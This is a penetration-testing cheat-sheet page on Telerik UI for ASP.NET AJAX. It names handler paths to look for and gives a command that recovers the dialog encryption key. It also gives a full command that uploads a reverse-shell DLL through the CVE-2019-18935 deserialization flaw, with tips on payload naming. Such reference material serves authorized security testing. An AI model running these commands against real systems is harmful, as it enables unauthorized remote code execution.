---
tags:
  - Web
---

# :material-web: Telerik UI

<span class="pill pill-hard">→ RCE</span> <span class="pill pill-info">web</span>

Telerik UI for ASP.NET AJAX (the RadControls / RadEditor / RadAsyncUpload stack) is
bundled into many .NET apps — including some DotNetNuke installs — and has a chain of
**hardcoded-key and insecure-deserialization RCEs**. Find the handler, recover the
key, get code execution.

!!! abstract "TL;DR"
    Look for `Telerik.Web.UI.DialogHandler.aspx` / `Telerik.Web.UI.WebResource.axd`.
    Old builds use default/hardcoded encryption keys (CVE-2017-11317/11357) or leak
    the key via XOR (CVE-2017-9248) → forge an upload; then RCE via the
    RadAsyncUpload deserialization bug (CVE-2019-18935).

## :material-magnify: Identify

```text
/Telerik.Web.UI.DialogHandler.aspx        # RadEditor dialog handler
/Telerik.Web.UI.WebResource.axd?type=rau  # RadAsyncUpload handler
/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx   # DNN-bundled
```

## :material-key: Key recovery

=== "Default keys (CVE-2017-11317 / 11357)"

    Older builds ship **hardcoded** `DialogParametersEncryptionKey` /
    `MachineKey` used to encrypt dialog params. Requires knowledge of internal
    paths to complete a file upload. PoC: [EDB-43874](https://www.exploit-db.com/exploits/43874).

=== "XOR key leak (CVE-2017-9248)"

    The `DialogParametersEncryptionKey` is recoverable via an XOR oracle.
    ```bash
    python3 43873.py -k https://$TARGET/Telerik.Web.UI.DialogHandler.aspx 48 all 21
    ```
    - `48` = number of key bytes — verify the correct length; if too high the hex
      bytes repeat.
    - **The key rotates daily.**
    - The exploit emits a CSP-loaded URL; if CSP blocks the injected script,
      disable CSP in the browser to view. PoC: [EDB-43873](https://www.exploit-db.com/exploits/43873).

## :material-fire: RCE — RadAsyncUpload deserialization (CVE-2019-18935)

Insecure deserialization in `RadAsyncUpload` → upload a malicious mixed-mode DLL that
executes on load:

```bash
python3 CVE-2019-18935.py -v 2014.1.225 \
  -p reverse-shell-x86.dll \
  -u https://$TARGET/Telerik.Web.UI.WebResource.axd?type=rau \
  -f 'C:\Windows\Temp\'
```

!!! bug "Do not upload the same DLL name twice"
    Re-uploading a `.dll` with an identical name **appends** rather than replacing —
    it crashes the server. Rename each payload build.

Reference: [Bishop Fox write-up](https://bishopfox.com/blog/cve-2019-18935-remote-code-execution-in-telerik-ui),
[noperator/CVE-2019-18935](https://github.com/noperator/CVE-2019-18935).

## :material-link-variant: Related

- Common in [DotNetNuke](dotnetnuke.md) and [ASP.NET](aspnet.md) apps; see [Deserialization](../web/deserialization.md).
- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Reference: [CVE-2019-18935](https://nvd.nist.gov/vuln/detail/CVE-2019-18935).
